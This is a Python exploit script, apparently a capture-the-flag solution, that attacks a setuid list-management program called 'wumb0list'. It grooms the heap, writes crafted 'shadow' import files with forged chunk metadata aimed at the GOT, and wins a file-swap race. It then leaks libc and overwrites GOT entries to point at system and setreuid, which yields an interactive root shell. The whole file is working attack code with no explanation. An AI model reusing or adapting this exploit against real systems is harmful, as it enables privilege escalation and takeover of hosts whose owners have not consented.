from ctypes import *
from struct import pack, unpack
from functools import partial
import subprocess
import pexpect
import signal
import sys
import os

p64 = partial(pack, "<Q")

class BaseStruct(LittleEndianStructure):
    _pack_ = 1

    def tobytes(self):
        return bytes(self)

    def __new__(self, sb=None):
        if sb:
            return self.from_buffer_copy(sb)
        else:
            return LittleEndianStructure.__new__(self)

    def __init__(self, sb=None):
        pass

# define HEADER_COOKIE (0x4092384748393046)
HEADER_COOKIE = 0x4092384748393046
class FileHeader(BaseStruct):
    _fields_ = [('hdr_cookie', c_uint64), ('entries', c_uint64)]
    def __init__(self, *args, **kwargs):
        self.hdr_cookie = HEADER_COOKIE
        BaseStruct.__init__(self, *args, **kwargs)

class FileEntry(BaseStruct):
    _fields_ = [('id', c_uint64), ('namelen', c_uint64)]
    _name = (c_ubyte * 0)()

    @property
    def name(self):
        return bytes(self._name)

    @name.setter
    def name(self, indata):
        self.namelen = len(indata)
        self._name = (self._name._type_ * len(indata))()
        memmove(self._name, indata, len(indata))

    def tobytes(self):
        return bytes(self) + self.name

sentinal = 0x000000000603100
got = 0x0000000000603000
leak_offset = 0x61a170
system_offset = 0x4f440
setreuid_offset = 0x116ac0
def main(proc, prog, cmd):
    def menu_opt(p, x, pr=False):
        p.expect("wisely: ")
        p.sendline(x)

    def exp_resp(p, exp, resp):
        p.expect(exp)
        p.sendline(resp)

    p = pexpect.spawn(prog)

    # groom heap
    menu_opt(p, "1")
    menu_opt(p, "1")
    exp_resp(p, "ID: ", "11")
    exp_resp(p, "name: ", "aaaa")
    menu_opt(p, "1")
    exp_resp(p, "ID: ", "22")
    exp_resp(p, "name: ", "bbbb")
    menu_opt(p, "5")
    menu_opt(p, "2")
    menu_opt(p, "1")
    exp_resp(p, "name: ", "A"*16)
    menu_opt(p, "2")
    exp_resp(p, "number: ", "0")
    menu_opt(p, "1")
    exp_resp(p, "name: ", "B"*24)
    menu_opt(p, "5")
    exp_resp(p, "number: ", "0")
    exp_resp(p, "ID: ", "22")
    exp_resp(p, "quantity: ", "69")
    menu_opt(p, "1")
    exp_resp(p, "name: ", "C"*24)
    menu_opt(p, "5")
    exp_resp(p, "number: ", "1")
    exp_resp(p, "ID: ", "22")
    exp_resp(p, "quantity: ", "69")
    menu_opt(p, "8")
    menu_opt(p, "1")
    menu_opt(p, "2")
    exp_resp(p, "ID: ", "11")

    # overflow pointers
    menu_opt(p, "4")
    exp_resp(p, "import: ", "shadow")

    # check if we have overflown
    print("SPEED RACER GO!")
    while True:
        menu_opt(p, "3")
        p.expect("Manage")
        if b"57: " in p.before:
            break
        menu_opt(p, "2")
        exp_resp(p, "ID: ", "1")
        menu_opt(p, "4")
        exp_resp(p, "import: ", "shadow")

    # calculate libc base
    sidx = p.before.find(b"57: ") + 4
    eidx = p.before.find(b"\n", sidx) - 1
    print("YEET")
    parsed = p.before[sidx:eidx]
    while len(parsed) < 8:
        parsed += b"\x00"
    leaked_addr = unpack("<Q", parsed)[0]
    libc = leaked_addr - leak_offset
    print("Leaked Address: 0x{:x}, libc base: 0x{:x}".format(leaked_addr, libc))
    # we don't need the subprocess anymore
    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)

    # overwrite got entries for strdup->system, mmap->setreuid
    menu_opt(p, "5")
    menu_opt(p, "2")
    menu_opt(p, "7")
    exp_resp(p, "number: ", "0")
    exp_resp(p, "ID: ", "9049711478571007")
    exp_resp(p, "quantity: ", str(libc + system_offset))
    menu_opt(p, "7")
    exp_resp(p, "number: ", "1")
    exp_resp(p, "ID: ", "9050226874646527")
    exp_resp(p, "quantity: ", str(libc + setreuid_offset))

    # clear shadow so it is 0 bytes
    with open("shadow", "wb"):
        pass

    # call setreuid(0, 0)
    menu_opt(p, "8")
    menu_opt(p, "1")
    menu_opt(p, "4")
    exp_resp(p, "import: ", "shadow")

    # call system("/bin/sh")
    menu_opt(p, "5")
    menu_opt(p, "2")
    menu_opt(p, "1")
    exp_resp(p, "name: ", cmd)
    p.interact()

sleeps = "20 50"

if len(sys.argv) < 3:
    print("{} <path to wumb0list> <program to execute>".format(sys.argv[0]))
    sys.exit(1)

fh = FileHeader()
fh.entries = 1

fe = FileEntry()
fe.id = 1
fe.name = b"cccc"

with open("shadow1", 'wb') as w:
    w.write(fh.tobytes() + fe.tobytes())

fe.name = b"a"*16 + p64(0) + p64(0x31) + p64(sentinal) * 2 + p64(got+8) + p64(57) + p64(0) + p64(0x21) + b"Q"*16 + p64(0) + p64(0x21) + p64(got+0x98) + p64(got) + p64(69) + p64(0x31) + b"B"*32 + p64(0) + p64(0x31) + b"C"*32 + p64(0) + p64(0x21) + p64(got+0x20) + p64(got)
with open("shadow2", 'wb') as w:
    w.write(fh.tobytes() + fe.tobytes())

with open("shadow", 'wb') as w:
    w.write(fh.tobytes() + fe.tobytes())

proc = subprocess.Popen("./switcher shadow " + sleeps, shell=True, preexec_fn=os.setsid)
try:
    main(proc, sys.argv[1], sys.argv[2])
finally:
    print("killing")
    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
    os.remove("shadow")
    os.remove("shadow1")
    os.remove("shadow2")
